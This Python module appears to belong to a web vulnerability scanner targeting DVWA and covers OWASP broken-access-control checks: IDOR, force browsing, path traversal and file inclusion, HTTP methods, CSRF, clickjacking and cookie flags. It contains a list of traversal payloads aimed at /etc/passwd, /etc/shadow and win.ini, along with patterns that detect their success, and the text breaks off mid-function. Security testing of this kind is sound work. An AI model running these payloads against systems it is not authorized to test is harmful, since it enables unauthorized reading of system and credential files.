"""
modules/access_control.py
OWASP A01:2025 — Broken Access Control
Covers:
  - IDOR (Insecure Direct Object Reference)
  - Force browsing / missing authorization checks
  - Horizontal & vertical privilege escalation PoCs
  - CSRF token absence / weakness detection
  - HTTP method override
  - Directory traversal
  - JWT / session token analysis (where applicable)
  - Clickjacking (X-Frame-Options / CSP frame-ancestors)
  - Missing authentication on sensitive pages
"""

import re
import json
from typing import List, Dict, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

from core.base_module import BaseModule
from core.finding import Finding
from core.crawler import DiscoveredUrl, DiscoveredForm


# ============================================================
#  CONFIGURATION CONSTANTS
# ============================================================

# Paths that should require authentication — 401/403 or redirect to login
SENSITIVE_PATHS = [
    "/admin/",
    "/admin/index.php",
    "/admin/users.php",
    "/admin/config.php",
    "/administrator/",
    "/phpmyadmin/",
    "/phpmyadmin/index.php",
    "/manager/",
    "/manage/",
    "/cpanel/",
    "/wp-admin/",
    "/dashboard/",
    "/user/profile",
    "/account/settings",
    "/api/admin",
    "/api/users",
    "/api/config",
    # DVWA specific
    "/vulnerabilities/",
    "/security.php",
    "/phpinfo.php",
    "/setup.php",
    "/dvwa/vulnerabilities/",
]

# DVWA IDOR test pages
DVWA_IDOR_ENDPOINTS = [
    {
        "url": "/vulnerabilities/idor/",
        "param": "id",
        "base_values": ["1", "2"],
        "escalation_values": ["0", "admin", "2", "3", "100", "-1"],
    },
    {
        "url": "/vulnerabilities/sqli/",
        "param": "id",
        "base_values": ["1"],
        "escalation_values": ["2", "3", "4", "5", "0"],
    },
]

# Traversal payloads
TRAVERSAL_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "..%2fetc%2fpasswd",
    "..%252fetc%252fpasswd",
    "%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/etc/passwd",
    "....//....//etc/passwd",
    "..\\..\\.\\etc\\passwd",
    "../etc/shadow",
    "../windows/win.ini",
    "..\\windows\\win.ini",
    # DVWA file inclusion
    "../../dvwa/php.ini",
    "../../../dvwa/hackable/uploads/",
]

TRAVERSAL_SUCCESS_PATTERNS = [
    r"root:x:0:0:",
    r"daemon:x:",
    r"www-data:x:",
    r"\[fonts\]",            # windows/win.ini
    r"\[extensions\]",
    r"\[boot loader\]",
    r"for 16-bit app support",
]

DVWA_FILE_INCLUSION_ENDPOINTS = [
    {
        "url": "/vulnerabilities/fi/",
        "param": "page",
        "base_value": "include.php",
    },
]

# HTTP methods to test on sensitive endpoints
HTTP_METHODS_TO_TEST = ["PUT", "DELETE", "PATCH", "TRACE", "OPTIONS", "HEAD", "CONNECT"]

# Response patterns indicating successful privileged access
ADMIN_ACCESS_PATTERNS = [
    r"welcome.*admin",
    r"admin.*panel",
    r"administration",
    r"user management",
    r"system settings",
    r"<title>.*admin",
    r"manage users",
    r"delete user",
    r"phpinfo\(\)",
    r"PHP Version",
]

# Patterns suggesting a page is protected (login redirect / 403)
PROTECTED_PATTERNS = [
    r"login",
    r"sign in",
    r"access denied",
    r"403",
    r"forbidden",
    r"unauthorized",
    r"please log",
    r"authentication required",
]

# CSRF-safe HTTP methods (don't check for token on these)
CSRF_SAFE_METHODS = {"GET", "HEAD", "OPTIONS", "TRACE"}


# ============================================================
#  MODULE CLASS
# ============================================================

class AccessControlModule(BaseModule):
    MODULE_NAME = "access_control"
    OWASP_CATEGORY = "A01"
    OWASP_NAME = "Broken Access Control"

    def run(
        self,
        urls: List[DiscoveredUrl],
        forms: List[DiscoveredForm],
    ) -> List[Finding]:

        self.log("[bold]Starting A01 Broken Access Control checks[/bold]")

        # 1. Force browsing / unauthenticated access to sensitive paths
        self._check_force_browsing()

        # 2. IDOR checks
        self._check_idor_dvwa()
        self._check_idor_url_params(urls)

        # 3. Directory / path traversal
        self._check_path_traversal_dvwa()
        self._check_path_traversal_urls(urls)
        self._check_path_traversal_forms(forms)

        # 4. HTTP method override
        self._check_http_methods()

        # 5. CSRF token detection
        self._check_csrf_forms(forms)

        # 6. Clickjacking
        self._check_clickjacking()

        # 7. Session / cookie security flags
        self._check_cookie_security()

        # 8. Privilege escalation PoC (DVWA specific)
        self._check_privilege_escalation()

        self.log(f"[green]A01 complete — {len(self.findings)} finding(s)[/green]")
        return self.findings

    # ============================================================
    #  FORCE BROWSING / MISSING AUTH
    # ============================================================

    def _check_force_browsing(self):
        """
        Test if sensitive URLs are accessible without authentication or
        by a low-privilege user. Uses a fresh unauthenticated session
        as a secondary probe.
        """
        self.log("Force Browsing: testing sensitive paths")

        import requests
        import urllib3
        urllib3.disable_warnings()

        unauth_session = requests.Session()
        unauth_session.verify = self.config.verify_ssl
        unauth_session.headers.update(self.config.get_headers())
        if self.config.get_proxies():
            unauth_session.proxies.update(self.config.get_proxies())

        for path in SENSITIVE_PATHS:
            url = self.config.base_url + path
            try:
                resp = unauth_session.get(url, timeout=self.config.timeout, allow_redirects=True)
            except Exception:
                continue

            if resp.status_code in (404, 500):
                continue

            # Check if accessible (not redirected to login, not 403)
            is_protected = self._is_response_protected(resp)
            has_admin_content = any(
                re.search(p, resp.text, re.IGNORECASE)
                for p in ADMIN_ACCESS_PATTERNS
            )

            if not is_protected or has_admin_content:
                severity = "High" if has_admin_content else "Medium"

                finding = Finding(
                    title=f"Missing Authentication — Sensitive Path Accessible: {path}",
                    vulnerability_type="Missing Authentication / Force Browsing",
                    owasp_category="A01",
                    owasp_name="Broken Access Control",
                    cwe_id="CWE-862",
                    severity=severity,
                    cvss_score=7.5 if severity == "High" else 5.3,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                    url=url,
                    method="GET",
                    parameter="",
                    payload="(unauthenticated request)",
                    description=(
                        f"The sensitive path '{path}' is accessible without authentication "
                        f"(HTTP {resp.status_code}). "
                        f"{'Admin-level content was detected in the response.' if has_admin_content else ''}"
                    ),
                    proof=(
                        f"Unauthenticated GET {url} returned HTTP {resp.status_code} "
                        f"({'admin content detected' if has_admin_content else 'not redirected to login'})"
                    ),
                    request_snippet=f"GET {url} HTTP/1.1\n(No session cookies)\n",
                    response_snippet=self.truncate_response(resp.text),
                    remediation=(
                        "1. Enforce authentication checks on ALL sensitive routes — server-side. "
                        "2. Implement a centralized authorization framework (RBAC/ABAC). "
                        "3. Redirect unauthenticated requests to the login page. "
                        "4. Return HTTP 401 or 403 for unauthorized access attempts. "
                        "5. Audit all routes in your application for missing auth decorators."
                    ),
                    references=[
                        "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
                        "https://cwe.mitre.org/data/definitions/862.html",
                        "https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html",
                    ],
                    module=self.MODULE_NAME,
                    confidence="High" if has_admin_content else "Medium",
                )
                self.add_finding(finding)

    def _is_response_protected(self, resp) -> bool:
        """Return True if response looks like it's behind auth."""
        if resp.status_code in (401, 403):
            return True
        # Redirected to login?
        if resp.url and "login" in resp.url.lower():
            return True
        # Content looks like login page?
        text_lower = resp.text.lower()
        for pat in PROTECTED_PATTERNS:
            if re.search(pat, text_lower) and len(resp.text) < 5000:
                return True
        return False

    # ============================================================
    #  IDOR
    # ============================================================

    def _check_idor_dvwa(self):
        """DVWA-specific IDOR checks — iterate IDs and compare responses."""
        self.log("IDOR: testing DVWA known endpoints")

        for ep in DVWA_IDOR_ENDPOINTS:
            url = self.config.base_url + ep["url"]
            param = ep["param"]

            # Get baseline response for a known good ID
            base_responses = {}
            for base_val in ep["base_values"]:
                resp = self.http.get(url, params={param: base_val})
                if resp and resp.status_code == 200:
                    base_responses[base_val] = resp.text

            if not base_responses:
                continue

            base_sample = list(base_responses.values())[0]

            # Try escalation values
            for test_val in ep["escalation_values"]:
                if test_val in base_responses:
                    continue
                resp = self.http.get(url, params={param: test_val})
                if resp is None or resp.status_code != 200:
                    continue

                # Different content = potentially different user/object data exposed
                if (resp.text != base_sample
                        and len(resp.text) > 200
                        and not self._looks_like_error(resp.text)
                        and not self._looks_like_login(resp.text)):

                    finding = Finding(
                        title=f"IDOR — Parameter: {param} at {ep['url']}",
                        vulnerability_type="Insecure Direct Object Reference (IDOR)",
                        owasp_category="A01",
                        owasp_name="Broken Access Control",
                        cwe_id="CWE-639",
                        severity="High",
                        cvss_score=8.1,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
                        url=url,
                        method="GET",
                        parameter=param,
                        payload=test_val,
                        description=(
                            f"Potential IDOR vulnerability in parameter '{param}' at {url}. "
                            f"Changing the value from a known ID to '{test_val}' returned different "
                            f"content ({len(resp.text)} bytes), suggesting object references are not "
                            "validated against the current user's authorization."
                        ),
                        proof=(
                            f"GET {url}?{param}={test_val} returned HTTP {resp.status_code}, "
                            f"{len(resp.text)} bytes (baseline: {len(base_sample)} bytes)"
                        ),
                        request_snippet=self.build_request_snippet("GET", url, params={param: test_val}),
                        response_snippet=self.truncate_response(resp.text),
                        remediation=(
                            "1. Validate that the authenticated user is authorized to access the requested resource. "
                            "2. Use indirect references (e.g., opaque tokens/UUIDs) instead of sequential IDs. "
                            "3. Apply server-side access control checks — never rely on client-side filtering. "
                            "4. Log and alert on access attempts to other users' resources."
                        ),
                        references=[
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References",
                            "https://cwe.mitre.org/data/definitions/639.html",
                        ],
                        module=self.MODULE_NAME,
                        confidence="Medium",
                    )
                    self.add_finding(finding)
                    break  # One finding per endpoint

    def _check_idor_url_params(self, urls: List[DiscoveredUrl]):
        """
        Look for numeric/ID parameters in discovered URLs
        and test adjacent ID values.
        """
        self.log(f"IDOR: testing {len(urls)} parameterised URLs")
        id_param_pattern = re.compile(r"^(id|user_id|uid|account_id|record_id|item_id|post_id|doc_id|file_id)$", re.IGNORECASE)
        numeric_val_pattern = re.compile(r"^\d+$")
        tested: Set[str] = set()

        for disc_url in urls:
            for param, value in disc_url.params.items():
                if not id_param_pattern.match(param):
                    continue
                if not numeric_val_pattern.match(str(value)):
                    continue

                key = f"{disc_url.url}:{param}:{value}"
                if key in tested:
                    continue
                tested.add(key)

                original_id = int(value)
                probe_ids = list({original_id - 1, original_id + 1, 1, 0, 9999})

                # Baseline
                base_params = dict(disc_url.params)
                base_resp = self.http.get(disc_url.url, params=base_params)
                if base_resp is None:
                    continue

                for probe_id in probe_ids:
                    if probe_id == original_id or probe_id < 0:
                        continue
                    test_params = dict(disc_url.params)
                    test_params[param] = str(probe_id)
                    resp = self.http.get(disc_url.url, params=test_params)

                    if resp is None or resp.status_code != 200:
                        continue

                    len_diff = abs(len(resp.text) - len(base_resp.text))
                    if (resp.text != base_resp.text
                            and len(resp.text) > 200
                            and len_diff > 30
                            and not self._looks_like_error(resp.text)
                            and not self._looks_like_login(resp.text)):

                        finding = Finding(
                            title=f"Potential IDOR — {param}={probe_id} at {disc_url.url}",
                            vulnerability_type="Insecure Direct Object Reference (IDOR)",
                            owasp_category="A01",
                            owasp_name="Broken Access Control",
                            cwe_id="CWE-639",
                            severity="Medium",
                            cvss_score=6.5,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
                            url=disc_url.url,
                            method="GET",
                            parameter=param,
                            payload=str(probe_id),
                            description=(
                                f"Numeric parameter '{param}' at {disc_url.url} may be vulnerable to IDOR. "
                                f"Probing adjacent ID {probe_id} (original: {original_id}) "
                                f"returned {len(resp.text)} bytes different from baseline."
                            ),
                            proof=(
                                f"ID {original_id} → {len(base_resp.text)} bytes; "
                                f"ID {probe_id} → {len(resp.text)} bytes (delta: {len_diff})"
                            ),
                            request_snippet=self.build_request_snippet("GET", disc_url.url, params=test_params),
                            response_snippet=self.truncate_response(resp.text),
                            remediation=(
                                "Validate object ownership server-side. "
                                "Use UUIDs or indirect references in public-facing APIs."
                            ),
                            references=[
                                "https://cwe.mitre.org/data/definitions/639.html",
                            ],
                            module=self.MODULE_NAME,
                            confidence="Medium",
                        )
                        self.add_finding(finding)
                        break

    # ============================================================
    #  PATH TRAVERSAL / FILE INCLUSION
    # ============================================================

    def _check_path_traversal_dvwa(self):
        """DVWA file inclusion endpoint."""
        self.log("Path Traversal: testing DVWA file inclusion endpoint")
        for ep in DVWA_FILE_INCLUSION_ENDPOINTS:
            url = self.config.base_url + ep["url"]
            for payload in TRAVERSAL_PAYLOADS:
                resp = self.http.get(url, params={ep["param"]: payload})
                if resp is None:
                    continue

                for pattern in TRAVERSAL_SUCCESS_PATTERNS:
                    match = re.search(pattern, resp.text, re.IGNORECASE)
                    if match:
                        finding = Finding(
                            title=f"Path Traversal / Local File Inclusion — {ep['param']}",
                            vulnerability_type="Path Traversal / Local File Inclusion",
                            owasp_category="A01",
                            owasp_name="Broken Access Control",
                            cwe_id="CWE-22",
                            severity="Critical",
                            cvss_score=9.1,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
                            url=url,
                            method="GET",
                            parameter=ep["param"],
                            payload=payload,
                            description=(
                                f"Local File Inclusion (LFI) confirmed via path traversal in '{ep['param']}'. "
                                f"The payload '{payload}' caused the server to include and display a local file "
                                f"(matched: '{match.group(0)}'). "
                                "An attacker can read arbitrary files including credentials, configs, and source code."
                            ),
                            proof=f"File content pattern '{pattern}' matched: '{match.group(0)}'",
                            request_snippet=self.build_request_snippet(
                                "GET", url, params={ep["param"]: payload}
                            ),
                            response_snippet=self.truncate_response(resp.text),
                            remediation=(
                                "1. Use a whitelist of allowed file names — never build paths from raw user input. "
                                "2. Canonicalize paths and reject any that traverse outside the intended directory. "
                                "3. Use realpath() / os.path.abspath() and validate the result starts with the base dir. "
                                "4. Disable PHP allow_url_include and restrict open_basedir."
                            ),
                            references=[
                                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
                                "https://cwe.mitre.org/data/definitions/22.html",
                            ],
                            module=self.MODULE_NAME,
                            confidence="High",
                        )
                        self.add_finding(finding)
                        return  # One finding per endpoint is enough

    def _check_path_traversal_urls(self, urls: List[DiscoveredUrl]):
        """Test parameterised URLs for path traversal."""
        self.log("Path Traversal: scanning URL params")
        file_param_pattern = re.compile(
            r"(file|path|page|include|load|doc|document|template|view|dir|folder|name|filename)",
            re.IGNORECASE
        )
        tested: Set[str] = set()
        for disc_url in urls:
            for param in disc_url.params:
                if not file_param_pattern.search(param):
                    continue
                key = f"{disc_url.url}:{param}"
                if key in tested:
                    continue
                tested.add(key)

                for payload in TRAVERSAL_PAYLOADS[:5]:  # Limit in non-deep mode
                    resp = self.http.get(disc_url.url, params={**disc_url.params, param: payload})
                    if resp is None:
                        continue
                    for pattern in TRAVERSAL_SUCCESS_PATTERNS:
                        if re.search(pattern, resp.text, re.IGNORECASE):
                            finding = Finding(
                                title=f"Path Traversal — {param} at {disc_url.url}",
                                vulnerability_type="Path Traversal",
                                owasp_category="A01",
                                owasp_name="Broken Access Control",
                                cwe_id="CWE-22",
                                severity="Critical",
                                cvss_score=9.1,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
                                url=disc_url.url,
                                method="GET",
                                parameter=param,
                                payload=payload,
                                description=f"Path traversal in '{param}' allows arbitrary file read.",
                                proof=f"Traversal pattern matched in response.",
                                request_snippet=self.build_request_snippet("GET", disc_url.url,
                                    params={**disc_url.params, param: payload}),
                                response_snippet=self.truncate_response(resp.text),
                                remediation="Validate and canonicalize file paths. Use an allowlist.",
                                references=["https://cwe.mitre.org/data/definitions/22.html"],
                                module=self.MODULE_NAME,
                                confidence="High",
                            )
                            self.add_finding(finding)
                            break

    def _check_path_traversal_forms(self, forms: List[DiscoveredForm]):
        """Test form fields for path traversal."""
        file_param_pattern = re.compile(
            r"(file|path|page|include|load|template|view|dir)", re.IGNORECASE
        )
        for form in forms:
            for field in form.fields:
                if not file_param_pattern.search(field.name):
                    continue
                base_data = {f.name: f.value for f in form.fields}
                for payload in TRAVERSAL_PAYLOADS[:3]:
                    test_data = dict(base_data)
                    test_data[field.name] = payload
                    resp = self.http.post(form.action, data=test_data) \
                        if form.method == "POST" \
                        else self.http.get(form.action, params=test_data)
                    if resp is None:
                        continue
                    for pattern in TRAVERSAL_SUCCESS_PATTERNS:
                        if re.search(pattern, resp.text, re.IGNORECASE):
                            finding = Finding(
                                title=f"Path Traversal (Form) — {field.name}",
                                vulnerability_type="Path Traversal",
                                owasp_category="A01",
                                owasp_name="Broken Access Control",
                                cwe_id="CWE-22",
                                severity="Critical",
                                cvss_score=9.1,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
                                url=form.action,
                                method=form.method,
                                parameter=field.name,
                                payload=payload,
                                description=f"Path traversal in form field '{field.name}'.",
                                proof="File content pattern found in response.",
                                request_snippet=self.build_request_snippet(
                                    form.method, form.action, data=test_data),
                                response_snippet=self.truncate_response(resp.text),
                                remediation="Validate paths using an allowlist and realpath canonicalization.",
                                references=["https://cwe.mitre.org/data/definitions/22.html"],
                                module=self.MODULE_NAME,
                                confidence="High",
                            )
                            self.add_finding(finding)
                            break

    # ============================================================
    #  HTTP METHOD OVERRIDE
    # ============================================================

    def _check_http_methods(self):
        """
        Test sensitive endpoints for dangerous HTTP methods
        (PUT, DELETE, TRACE, etc.).
        """
        self.log("HTTP Methods: probing dangerous methods on key endpoints")
        test_urls = [self.config.base_url + path for path in SENSITIVE_PATHS[:6]]
        test_urls.append(self.config.base_url + "/")

        import requests
        for url in test_urls:
            for method in HTTP_METHODS_TO_TEST:
                try:
                    resp = self.http.session.request(
                        method, url,
                        timeout=self.config.timeout,
                        allow_redirects=False,
                    )
                    if resp.status_code not in (405, 501, 404, 400):
                        # Method appears to be accepted
                        if method == "TRACE" and resp.status_code == 200:
                            finding = Finding(
                                title=f"HTTP TRACE Method Enabled — {url}",
                                vulnerability_type="HTTP TRACE Method Enabled",
                                owasp_category="A01",
                                owasp_name="Broken Access Control",
                                cwe_id="CWE-16",
                                severity="Low",
                                cvss_score=3.1,
                                cvss_vector="CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N",
                                url=url,
                                method="TRACE",
                                parameter="",
                                payload="",
                                description=(
                                    "HTTP TRACE method is enabled. "
                                    "Combined with a browser vulnerability (XST), "
                                    "this can be used to steal cookies."
                                ),
                                proof=f"TRACE {url} returned HTTP {resp.status_code}",
                                request_snippet=f"TRACE {url} HTTP/1.1",
                                response_snippet=self.truncate_response(resp.text),
                                remediation="Disable HTTP TRACE method in the web server configuration.",
                                references=[
                                    "https://owasp.org/www-community/attacks/Cross_Site_Tracing",
                                ],
                                module=self.MODULE_NAME,
                                confidence="High",
                            )
                            self.add_finding(finding)
                        elif method in ("PUT", "DELETE") and resp.status_code in (200, 201, 204):
                            finding = Finding(
                                title=f"Dangerous HTTP Method Allowed: {method} — {url}",
                                vulnerability_type="Dangerous HTTP Method Enabled",
                                owasp_category="A01",
                                owasp_name="Broken Access Control",
                                cwe_id="CWE-650",
                                severity="High",
                                cvss_score=8.1,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H",
                                url=url,
                                method=method,
                                parameter="",
                                payload="",
                                description=(
                                    f"HTTP {method} method is accepted on {url} (HTTP {resp.status_code}). "
                                    "This may allow an attacker to modify or delete server resources."
                                ),
                                proof=f"{method} {url} → HTTP {resp.status_code}",
                                request_snippet=f"{method} {url} HTTP/1.1",
                                response_snippet=self.truncate_response(resp.text),
                                remediation=(
                                    f"Explicitly restrict allowed HTTP methods to GET/POST. "
                                    "Configure your web server to reject all other methods unless required."
                                ),
                                references=[
                                    "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods",
                                    "https://cwe.mitre.org/data/definitions/650.html",
                                ],
                                module=self.MODULE_NAME,
                                confidence="High",
                            )
                            self.add_finding(finding)
                except Exception:
                    continue

    # ============================================================
    #  CSRF
    # ============================================================

    def _check_csrf_forms(self, forms: List[DiscoveredForm]):
        """
        Detect forms that submit state-changing requests without CSRF tokens.
        Also checks for weak/predictable token patterns.
        """
        self.log(f"CSRF: analysing {len(forms)} forms")

        csrf_token_names = re.compile(
            r"(csrf|token|_token|user_token|csrfmiddlewaretoken|authenticity_token|nonce|_wpnonce)",
            re.IGNORECASE
        )

        for form in forms:
            if form.method.upper() in CSRF_SAFE_METHODS:
                continue

            # Check if any hidden/text field looks like a CSRF token
            has_csrf_token = any(
                csrf_token_names.search(f.name) for f in form.fields
            )
            # Check if the action URL contains sensitive operations
            sensitive_action = re.search(
                r"(change|update|delete|edit|save|submit|create|admin|password|profile|transfer)",
                form.action, re.IGNORECASE
            )

            if not has_csrf_token:
                confidence = "High" if sensitive_action else "Medium"
                severity = "High" if sensitive_action else "Medium"

                finding = Finding(
                    title=f"CSRF Protection Missing — {form.action}",
                    vulnerability_type="Cross-Site Request Forgery (CSRF)",
                    owasp_category="A01",
                    owasp_name="Broken Access Control",
                    cwe_id="CWE-352",
                    severity=severity,
                    cvss_score=6.5 if severity == "High" else 4.3,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
                    url=form.action,
                    method=form.method,
                    parameter="(form-level)",
                    payload="",
                    description=(
                        f"The {form.method} form at {form.action} does not include a CSRF token. "
                        "An attacker can craft a malicious page that silently submits this form "
                        "on behalf of an authenticated victim."
                    ),
                    proof=(
                        f"Form fields: {[f.name for f in form.fields]}. "
                        "No CSRF token field detected."
                    ),
                    request_snippet=(
                        f"{form.method} {form.action} HTTP/1.1\n"
                        f"Fields: {', '.join(f.name for f in form.fields)}"
                    ),
                    response_snippet="",
                    remediation=(
                        "1. Implement synchronizer token pattern — include a unique, unpredictable CSRF token in every state-changing form. "
                        "2. Use the SameSite=Strict or SameSite=Lax cookie attribute. "
                        "3. Verify the Origin/Referer header on state-changing requests. "
                        "4. Consider using the Double Submit Cookie pattern as a supplement."
                    ),
                    references=[
                        "https://owasp.org/www-community/attacks/csrf",
                        "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",
                        "https://cwe.mitre.org/data/definitions/352.html",
                    ],
                    module=self.MODULE_NAME,
                    confidence=confidence,
                )
                self.add_finding(finding)

            else:
                # Has a CSRF token field — check if it's validated
                # PoC: submit the form with a wrong token and see if it succeeds
                token_field = next(
                    (f for f in form.fields if csrf_token_names.search(f.name)), None
                )
                if token_field and self.is_deep():
                    self._verify_csrf_validation(form, token_field)

    def _verify_csrf_validation(self, form, token_field):
        """
        PoC: Send form with a tampered CSRF token. If it succeeds, the token isn't validated.
        """
        base_data = {f.name: f.value for f in form.fields}
        tampered_data = dict(base_data)
        tampered_data[token_field.name] = "INVALID_TOKEN_XXXXXXXXXXXXXXXX"

        if form.method.upper() == "POST":
            resp = self.http.post(form.action, data=tampered_data)
        else:
            resp = self.http.get(form.action, params=tampered_data)

        if resp is None:
            return

        # If no error/rejection page, the token isn't validated
        rejection_patterns = [
            r"invalid token",
            r"csrf",
            r"forbidden",
            r"security token",
            r"invalid request",
        ]
        token_validated = any(
            re.search(p, resp.text, re.IGNORECASE) for p in rejection_patterns
        ) or resp.status_code in (403, 419)

        if not token_validated:
            finding = Finding(
                title=f"CSRF Token Not Validated — {form.action}",
                vulnerability_type="CSRF Token Bypass",
                owasp_category="A01",
                owasp_name="Broken Access Control",
                cwe_id="CWE-352",
                severity="High",
                cvss_score=8.0,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
                url=form.action,
                method=form.method,
                parameter=token_field.name,
                payload="INVALID_TOKEN_XXXXXXXXXXXXXXXX",
                description=(
                    f"The form at {form.action} has a CSRF token field ('{token_field.name}'), "
                    "but the server accepted a tampered/invalid token without rejecting the request. "
                    "The CSRF protection is present but not enforced."
                ),
                proof=(
                    f"Submitted form with token=INVALID_TOKEN_XXXXXXXXXXXXXXXX "
                    f"→ HTTP {resp.status_code}, no rejection detected."
                ),
                request_snippet=self.build_request_snippet(
                    form.method, form.action, data=tampered_data),
                response_snippet=self.truncate_response(resp.text),
                remediation=(
                    "Validate CSRF tokens server-side on every state-changing request. "
                    "Reject requests with missing, expired, or tampered tokens with HTTP 403."
                ),
                references=[
                    "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",
                ],
                module=self.MODULE_NAME,
                confidence="High",
            )
            self.add_finding(finding)

    # ============================================================
    #  CLICKJACKING
    # ============================================================

    def _check_clickjacking(self):
        """Check if pages can be embedded in iframes (X-Frame-Options / CSP)."""
        self.log("Clickjacking: checking security headers")

        resp = self.http.get(self.config.base_url)
        if resp is None:
            return

        headers = {k.lower(): v for k, v in resp.headers.items()}
        xfo = headers.get("x-frame-options", "")
        csp = headers.get("content-security-policy", "")

        has_frame_protection = (
            xfo.upper() in ("DENY", "SAMEORIGIN")
            or "frame-ancestors" in csp.lower()
        )

        if not has_frame_protection:
            finding = Finding(
                title="Clickjacking — Missing X-Frame-Options / CSP frame-ancestors",
                vulnerability_type="Clickjacking",
                owasp_category="A01",
                owasp_name="Broken Access Control",
                cwe_id="CWE-1021",
                severity="Medium",
                cvss_score=4.7,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
                url=self.config.base_url,
                method="GET",
                parameter="",
                payload="",
                description=(
                    "The application does not set X-Frame-Options or CSP frame-ancestors, "
                    "allowing it to be embedded in a malicious iframe. "
                    "An attacker can overlay transparent UI elements to trick users into "
                    "performing unintended actions (clickjacking)."
                ),
                proof=(
                    f"X-Frame-Options: '{xfo or 'NOT SET'}'\n"
                    f"Content-Security-Policy: '{csp[:100] or 'NOT SET'}'"
                ),
                request_snippet=f"GET {self.config.base_url} HTTP/1.1",
                response_snippet=(
                    f"X-Frame-Options: {xfo or '(missing)'}\n"
                    f"Content-Security-Policy: {csp[:200] or '(missing)'}"
                ),
                remediation=(
                    "Add to HTTP responses:\n"
                    "  X-Frame-Options: DENY\n"
                    "  Content-Security-Policy: frame-ancestors 'none';\n"
                    "Prefer CSP frame-ancestors as it is more flexible and supersedes X-Frame-Options."
                ),
                references=[
                    "https://owasp.org/www-community/attacks/Clickjacking",
                    "https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html",
                    "https://cwe.mitre.org/data/definitions/1021.html",
                ],
                module=self.MODULE_NAME,
                confidence="High",
            )
            self.add_finding(finding)

    # ============================================================
    #  COOKIE SECURITY FLAGS
    # ============================================================

    def _check_cookie_security(self):
        """Inspect session cookie attributes: HttpOnly, Secure, SameSite."""
        self.log("Cookie security: inspecting session cookies")

        resp = self.http.get(self.config.base_url)
        if resp is None:
            return

        # Look at Set-Cookie headers
        for cookie in resp.cookies:
            issues = []
            if not cookie.has_nonstandard_attr("HttpOnly") and not cookie._rest.get("HttpOnly"):
                issues.append("Missing HttpOnly flag (allows JavaScript access to cookie)")
            if not cookie.secure:
                issues.append("Missing Secure flag (cookie transmitted over HTTP)")

            # Check SameSite from raw header
            raw_set_cookie = resp.headers.get("Set-Cookie", "")
            if "samesite" not in raw_set_cookie.lower():
                issues.append("Missing SameSite attribute (CSRF risk)")

            if issues:
                finding = Finding(
                    title=f"Insecure Cookie Attributes — {cookie.name}",
                    vulnerability_type="Insecure Cookie Configuration",
                    owasp_category="A01",
                    owasp_name="Broken Access Control",
                    cwe_id="CWE-614",
                    severity="Medium",
                    cvss_score=5.4,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
                    url=self.config.base_url,
                    method="GET",
                    parameter=f"Cookie: {cookie.name}",
                    payload="",
                    description=(
                        f"Session cookie '{cookie.name}' has insecure attributes:\n"
                        + "\n".join(f"  • {i}" for i in issues)
                    ),
                    proof=f"Set-Cookie: {cookie.name}=...; (issues: {'; '.join(issues)})",
                    request_snippet=f"GET {self.config.base_url} HTTP/1.1",
                    response_snippet=f"Set-Cookie: {raw_set_cookie[:200]}",
                    remediation=(
                        "Set session cookies with:\n"
                        "  Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict; Path=/\n"
                        "  • HttpOnly prevents JavaScript from reading the cookie.\n"
                        "  • Secure ensures transmission over HTTPS only.\n"
                        "  • SameSite=Strict prevents CSRF attacks."
                    ),
                    references=[
                        "https://owasp.org/www-community/controls/SecureFlag",
                        "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html",
                        "https://cwe.mitre.org/data/definitions/614.html",
                    ],
                    module=self.MODULE_NAME,
                    confidence="High",
                )
                self.add_finding(finding)
                break  # One finding per scan for cookie issues

    # ============================================================
    #  PRIVILEGE ESCALATION PoC (DVWA)
    # ============================================================

    def _check_privilege_escalation(self):
        """
        DVWA-specific: check if the security level can be changed by a
        low-privilege user (admin-equivalent action without re-verification).
        """
        self.log("Privilege Escalation: testing DVWA security level change")
        security_url = self.config.base_url + "/security.php"

        resp = self.http.get(security_url)
        if resp is None or resp.status_code != 200:
            return

        # If we're logged in as admin and can access this, note it
        if "security level" in resp.text.lower() or "seclev_submit" in resp.text.lower():
            # Try changing to a more permissive level without re-auth
            from core.http_client import HttpClient
            from core.config import ScanConfig

            # Get CSRF token
            import re as _re
